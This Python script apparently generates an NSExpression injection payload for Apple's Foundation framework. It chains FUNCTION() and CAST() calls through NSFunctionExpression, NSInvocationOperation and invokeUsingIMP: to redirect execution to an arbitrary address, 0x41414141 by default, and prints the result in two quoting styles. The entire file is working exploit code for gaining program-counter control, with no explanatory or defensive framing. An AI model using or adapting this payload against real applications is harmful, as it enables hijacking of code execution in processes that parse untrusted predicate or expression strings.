def stringify(o):
    if isinstance(o, str):
        return '"%s"' % o

    if isinstance(o, list):
        return '{' + ','.join(map(stringify, o)) + '}'

    return str(o)


class Call:
    def __init__(self, target, sel, *args):
        self.target = target
        self.sel = sel
        self.args = args

    def __str__(self):
        if len(self.args):
            joint = ','.join(map(stringify, self.args))
            tail = ',' + joint
        else:
            tail = ''
        return f'FUNCTION({stringify(self.target)},"{self.sel}"{tail})'


class Clazz:
    def __init__(self, name):
        self.name = name

    def __str__(self):
        return f'CAST("{self.name}","Class")'


def selector(name):
    expr = Call(Clazz('NSFunctionExpression'), 'alloc')
    expr = Call(expr, 'initWithTarget:selectorName:arguments:', '', name, [])
    return Call(expr, 'selector')


def pc_control(pc=0x41414141):
    NSString = Clazz('NSString')
    op = Call(Clazz('NSInvocationOperation'), 'alloc')
    op = Call(op, 'initWithTarget:selector:object:',
              NSString, selector('alloc'), [])
    invocation = Call(op, 'invocation')
    imp = Call(pc, 'intValue')
    return Call(invocation, 'invokeUsingIMP:', imp)


payload = pc_control()
print(payload)
print(str(payload).replace('"', "'"))
